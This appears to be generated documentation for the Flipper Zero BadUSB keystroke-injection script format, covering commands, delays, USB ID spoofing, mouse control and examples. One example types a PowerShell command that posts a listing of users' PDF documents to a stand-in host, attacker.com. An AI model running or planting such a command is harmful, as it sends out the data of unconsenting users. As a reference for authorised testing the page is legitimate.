# BadUSB Script Format

<cite>
**Referenced Files in This Document**   
- [BadUsbScriptFormat.md](file://documentation/file_formats/BadUsbScriptFormat.md)
</cite>

## Table of Contents
1. [Introduction](#introduction)
2. [Script File Format](#script-file-format)
3. [Command Syntax](#command-syntax)
4. [Command Set](#command-set)
5. [Metadata and Configuration](#metadata-and-configuration)
6. [Execution Model](#execution-model)
7. [Examples](#examples)

## Introduction

The BadUSB script format is a text-based scripting language used by the Flipper Zero to emulate USB Human Interface Device (HID) input for security testing and penetration testing purposes. This format extends the classic Duckyscript syntax with additional commands and features specific to the Flipper Zero platform. The scripts are designed to automate keyboard, mouse, and media key inputs when the device is connected to a target computer via USB.

The BadUSB functionality allows the Flipper Zero to act as a programmable USB keyboard and mouse, enabling it to execute pre-defined sequences of keystrokes and mouse movements. This capability is commonly used in security assessments to test system vulnerabilities, demonstrate social engineering attacks, or automate repetitive tasks.

**Section sources**
- [BadUsbScriptFormat.md](file://documentation/file_formats/BadUsbScriptFormat.md)

## Script File Format

BadUSB scripts are stored as plain text files with the `.txt` extension. The format is intentionally simple and does not require compilation, allowing users to create and modify scripts directly on the device or on a computer before transferring them to the Flipper Zero.

The script files support both Unix-style line endings (`\n`) and Windows-style line endings (`\r\n`), ensuring compatibility across different operating systems. Empty lines are permitted and are ignored during script execution, which allows for improved readability through strategic spacing. Users can also use spaces or tabs for line indentation without affecting script functionality.

The simplicity of the text-based format makes it easy to create, edit, and share BadUSB scripts using any text editor. Scripts are typically stored in the Flipper Zero's internal storage or on an SD card in a designated directory for BadUSB applications.

**Section sources**
- [BadUsbScriptFormat.md](file://documentation/file_formats/BadUsbScriptFormat.md)

## Command Syntax

The BadUSB script format uses a command-based syntax where each line typically contains a single command followed by optional parameters. Commands are case-insensitive and are processed sequentially from top to bottom. The interpreter ignores any text following the REM command, treating it as a comment.

The command syntax is designed to be intuitive and easy to learn, drawing inspiration from the original USB Rubber Ducky implementation while adding Flipper Zero-specific enhancements. Commands can be grouped into several categories including delays, key presses, string input, mouse control, and system-level operations.

The interpreter processes each command in sequence, converting them into appropriate USB HID reports that are then transmitted to the host computer. This allows the Flipper Zero to simulate various types of user input, from simple keystrokes to complex keyboard shortcuts and mouse movements.

**Section sources**
- [BadUsbScriptFormat.md](file://documentation/file_formats/BadUsbScriptFormat.md)

## Command Set

### Comment Line

The REM command is used to add comments to a script. All text following the REM command on the same line is ignored by the interpreter and serves only as documentation for the script author.

| Command | Parameters   | Notes |
| ------- | ------------ | ----- |
| REM     | Comment text |       |

### Delay Commands

Delay commands control the timing of script execution, allowing for pauses between actions to accommodate system response times or application loading.

| Command       | Parameters        | Notes                               |
| ------------- | ----------------- | ----------------------------------- |
| DELAY         | Delay value in ms | Single delay                        |
| DEFAULT_DELAY | Delay value in ms | Add delay before every next command |
| DEFAULTDELAY  | Delay value in ms | Same as DEFAULT_DELAY               |

The DELAY command introduces a pause of the specified duration in milliseconds. DEFAULT_DELAY (or its alias DEFAULTDELAY) sets a default delay that is automatically applied before each subsequent command, eliminating the need to specify delays repeatedly.

### Special Keys

Special keys represent non-character keys on a keyboard that perform specific functions.

| Command            | Notes            |
| ------------------ | ---------------- |
| DOWNARROW / DOWN   |                  |
| LEFTARROW / LEFT   |                  |
| RIGHTARROW / RIGHT |                  |
| UPARROW / UP       |                  |
| ENTER              |                  |
| DELETE             |                  |
| BACKSPACE          |                  |
| END                |                  |
| HOME               |                  |
| ESCAPE / ESC       |                  |
| INSERT             |                  |
| PAGEUP             |                  |
| PAGEDOWN           |                  |
| CAPSLOCK           |                  |
| NUMLOCK            |                  |
| SCROLLLOCK         |                  |
| PRINTSCREEN        |                  |
| BREAK              | Pause/Break key  |
| PAUSE              | Pause/Break key  |
| SPACE              |                  |
| TAB                |                  |
| MENU               | Context menu key |
| APP                | Same as MENU     |
| Fx                 | F1-F12 keys      |

### Modifier Keys

Modifier keys are used in combination with other keys to perform keyboard shortcuts.

| Command | Notes        |
| ------- | ------------ |
| CTRL    |              |
| CONTROL | Same as CTRL |
| SHIFT   |              |
| ALT     |              |
| GUI     |              |
| WINDOWS | Same as GUI  |

Multiple modifier keys can be chained together using hyphens (`-`) or spaces to create complex keyboard shortcuts (e.g., CTRL-ALT-DELETE).

### Key Hold and Release

These commands allow for pressing and holding keys, which is useful for keyboard shortcuts or gaming controls.

| Command | Parameters                      | Notes                                    |
| ------- | ------------------------------- | ---------------------------------------- |
| HOLD    | Special key or single character | Press and hold key until RELEASE command |
| RELEASE | Special key or single character | Release key                              |

Up to five keys can be held simultaneously, simulating complex key combinations.

### String Commands

String commands facilitate the input of text, which is particularly useful for automated form filling or command execution.

| Command          | Parameters  | Notes                                      |
| ---------------- | ----------- | ------------------------------------------ |
| STRING           | Text string | Print text string                          |
| STRINGLN         | Text string | Print text string and press enter after it |
| STRING_FROM_FILE | File path   | Print text contained in a file             |

### String Delay

String delay commands control the timing between individual keystrokes when typing strings.

| Command              | Parameters        | Notes                                         |
| -------------------- | ----------------- | --------------------------------------------- |
| STRING_DELAY         | Delay value in ms | Applied once to next appearing STRING command |
| STRINGDELAY          | Delay value in ms | Same as STRING_DELAY                          |
| DEFAULT_STRING_DELAY | Delay value in ms | Apply to every appearing STRING command       |
| DEFAULTSTRINGDELAY   | Delay value in ms | Same as DEFAULT_STRING_DELAY                  |

### Repeat Command

The REPEAT command allows for repeating the previous command a specified number of times.

| Command | Parameters                   | Notes                   |
| ------- | ---------------------------- | ----------------------- |
| REPEAT  | Number of additional repeats | Repeat previous command |

### ALT+Numpad Input

This feature enables input of special characters using the ALT+Numpad method, which is particularly useful on Windows systems.

| Command   | Parameters     | Notes                                                           |
| --------- | -------------- | --------------------------------------------------------------- |
| ALTCHAR   | Character code | Print single character                                          |
| ALTSTRING | Text string    | Print text string using ALT+Numpad method                       |
| ALTCODE   | Text string    | Same as ALTSTRING, presents in some Duckyscript implementations |

### SysRq Command

The SYSRQ command sends a SysRq (System Request) key combination, which can trigger special kernel-level operations on Linux systems.

| Command | Parameters       | Notes |
| ------- | ---------------- | ----- |
| SYSRQ   | Single character |       |

### Media Keys

Media keys control multimedia functions on the host computer.

| Command | Parameters                | Notes |
| ------- | ------------------------- | ----- |
| MEDIA   | Media key, see list below |       |

Supported media keys include:
- POWER, REBOOT, SLEEP, LOGOFF, EXIT
- HOME, BACK, FORWARD, REFRESH
- SNAPSHOT (Take photo in a camera app)
- PLAY, PAUSE, PLAY_PAUSE, NEXT_TRACK, PREV_TRACK, STOP, EJECT
- MUTE, VOLUME_UP, VOLUME_DOWN
- FN (Fn/Globe key on Mac keyboard)
- BRIGHT_UP (Increase display brightness)
- BRIGHT_DOWN (Decrease display brightness)

### Fn/Globe Key Commands (Mac/iPad)

The GLOBE command is specifically designed for Mac and iPad keyboards.

| Command | Parameters                      | Notes |
| ------- | ------------------------------- | ----- |
| GLOBE   | Special key or single character |       |

### Wait for Button Press

This command pauses script execution until the user presses a button on the Flipper Zero.

| Command               | Parameters   | Notes                                                                 |
| --------------------- | ------------ | --------------------------------------------------------------------- |
| WAIT_FOR_BUTTON_PRESS | None         | Will wait for the user to press a button to continue script execution |

### USB Device ID

The ID command allows setting a custom USB HID device identifier, which can be used to impersonate different types of USB keyboards.

| Command | Parameters                   | Notes |
| ------- | ---------------------------- | ----- |
| ID      | VID:PID Manufacturer:Product |       |

The ID command must be placed on the first line of the script as it is executed before the script runs. VID and PID are hexadecimal codes that identify the vendor and product, while Manufacturer and Product are optional text strings.

### Mouse Commands

Mouse commands enable the Flipper Zero to simulate mouse movements and clicks.

| Command       | Parameters                     | Notes                            |
| ------------- | -------------------------------| -------------------------------- |
| LEFTCLICK     | None                           |                                  |
| LEFT_CLICK    | None                           | functionally same as LEFTCLICK   |
| RIGHTCLICK    | None                           |                                  |
| RIGHT_CLICK   | None                           | functionally same as RIGHTCLICK  |
| MOUSEMOVE     | x y: int move mount/direction  |                                  |
| MOUSE_MOVE    | x y: int move mount/direction  | functionally same as MOUSEMOVE   |
| MOUSESCROLL   | delta: int scroll distance     |                                  |
| MOUSE_SCROLL  | delta: int scroll distance     | functionally same as MOUSESCROLL |

Mouse click commands support the HOLD functionality, allowing for drag operations when combined with the HOLD and RELEASE commands.

**Section sources**
- [BadUsbScriptFormat.md](file://documentation/file_formats/BadUsbScriptFormat.md)

## Metadata and Configuration

The BadUSB script format includes several configuration options that affect script execution behavior. These settings are implemented as commands within the script itself rather than in a separate configuration file, maintaining the simplicity of the single-file script approach.

The most important configuration command is ID, which sets the USB device identifier. This command must appear on the first line of the script and defines the Vendor ID (VID), Product ID (PID), manufacturer name, and product name that the Flipper Zero will present to the host computer when connected via USB. This feature enables the device to impersonate various types of keyboards, potentially bypassing security measures that whitelist specific USB devices.

Timing configuration is handled through several delay-related commands. The DEFAULT_DELAY command sets a global delay that is automatically inserted before each subsequent command, establishing a consistent pace for script execution. For string input specifically, DEFAULT_STRING_DELAY controls the interval between individual keystrokes, allowing for natural-looking typing speeds.

The script format also supports conditional execution through the WAIT_FOR_BUTTON_PRESS command, which introduces user interaction into automated scripts. This can be used to create interactive attack scenarios where the user decides when to proceed with potentially destructive operations.

**Section sources**
- [BadUsbScriptFormat.md](file://documentation/file_formats/BadUsbScriptFormat.md)

## Execution Model

The BadUSB script execution model follows a straightforward linear processing approach. The interpreter reads the script file line by line, parsing each command and converting it into appropriate USB HID reports that are then transmitted to the host computer.

When a script is executed, the Flipper Zero first checks for the presence of an ID command on the first line. If found, it configures the USB HID descriptor accordingly before proceeding with the rest of the script. This allows the device to present itself as a different USB keyboard device, which can be useful for bypassing security policies that restrict input from unknown devices.

The interpreter processes commands sequentially, with timing controlled by explicit DELAY commands or implicit delays set by DEFAULT_DELAY. String commands are broken down into individual keystrokes, with optional delays between characters controlled by STRING_DELAY or DEFAULT_STRING_DELAY settings.

Keyboard modifiers (CTRL, ALT, SHIFT, GUI) are handled by setting the appropriate modifier bits in the USB HID report. Multiple modifiers can be combined in a single command by separating them with hyphens or spaces. The HOLD command keeps the specified key pressed by maintaining the corresponding key code in the active keys array, while RELEASE removes it.

Mouse commands generate relative movement reports that are interpreted by the host operating system as cursor movement. The x and y parameters specify the direction and distance of movement, while MOUSESCROLL generates vertical scroll wheel events.

The execution continues until all commands have been processed or until an error occurs. Error handling is minimal, with the interpreter typically continuing to the next command even if a previous command fails.

**Section sources**
- [BadUsbScriptFormat.md](file://documentation/file_formats/BadUsbScriptFormat.md)

## Examples

### Basic Script Example

```
REM This is a simple example script
DEFAULT_DELAY 500
GUI r
DELAY 500
STRING notepad.exe
ENTER
DELAY 1000
STRING Hello, World!
ENTER
```

This script opens the Run dialog (Windows key + R), waits 500ms, types "notepad.exe", presses Enter, waits for Notepad to open, and then types "Hello, World!" followed by Enter.

### Advanced Script with Custom Device ID

```
ID 0x05ac:0x025b Apple Inc.:Apple Keyboard
DEFAULT_DELAY 250
GUI SPACE
DELAY 1000
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING whoami
ENTER
```

This script configures the Flipper Zero to impersonate an Apple keyboard, opens Spotlight search (Command + Space), launches Terminal, and executes the "whoami" command to display the current username.

### Script with User Interaction

```
REM Data exfiltration script with user confirmation
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 1000
GUI r
DELAY 500
STRING cmd.exe
ENTER
DELAY 1000
STRING powershell -Command "Invoke-WebRequest -Uri 'http://attacker.com/upload' -Method POST -Body (Get-ChildItem C:\Users\*\Documents\*.pdf -Recurse | Out-String)"
ENTER
```

This script waits for the user to press a button before proceeding, providing a safety mechanism for potentially malicious operations. It opens Command Prompt and executes a PowerShell command to upload PDF files from user documents to a remote server.

### Script with Mouse Control

```
DEFAULT_DELAY 500
MOUSEMOVE 100 100
LEFTCLICK
DELAY 1000
STRING This text is typed after clicking
```

This script moves the mouse cursor 100 pixels right and 100 pixels down from its current position, performs a left mouse click, waits for 1 second, and then types the specified text.

**Section sources**
- [BadUsbScriptFormat.md](file://documentation/file_formats/BadUsbScriptFormat.md)